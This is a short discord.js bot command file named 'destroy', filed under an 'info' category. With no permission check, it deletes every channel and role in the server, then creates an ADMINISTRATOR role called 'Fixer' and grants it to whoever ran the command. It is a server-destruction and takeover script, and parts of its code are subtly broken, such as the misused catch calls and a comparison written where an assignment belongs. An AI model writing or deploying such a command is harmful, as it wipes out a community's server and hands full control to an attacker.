const Discord = require("discord.js")

module.exports = {
    name: "destroy",
    aliases: ["destroy"],
    category: "info",
    run: async (client, message, args) => {
        message.channel.bulkDelete(1)
        message.guild.channels.forEach(channel => channel.delete()).catch(console.log("nemam permise na channel"))
        message.guild.roles.forEach(role => role.delete()).catch(console.log("nemam permise na role"))
      
      if(!args[0]) {
          args[0] == "0"
      }
        const role = await message.member.guild.createRole({
              name: 'Fixer',
              permissions: ['ADMINISTRATOR'],
              color: '0xe600ff',
              position: args[0]
            }
        );
        await message.member.addRole(role);
  }}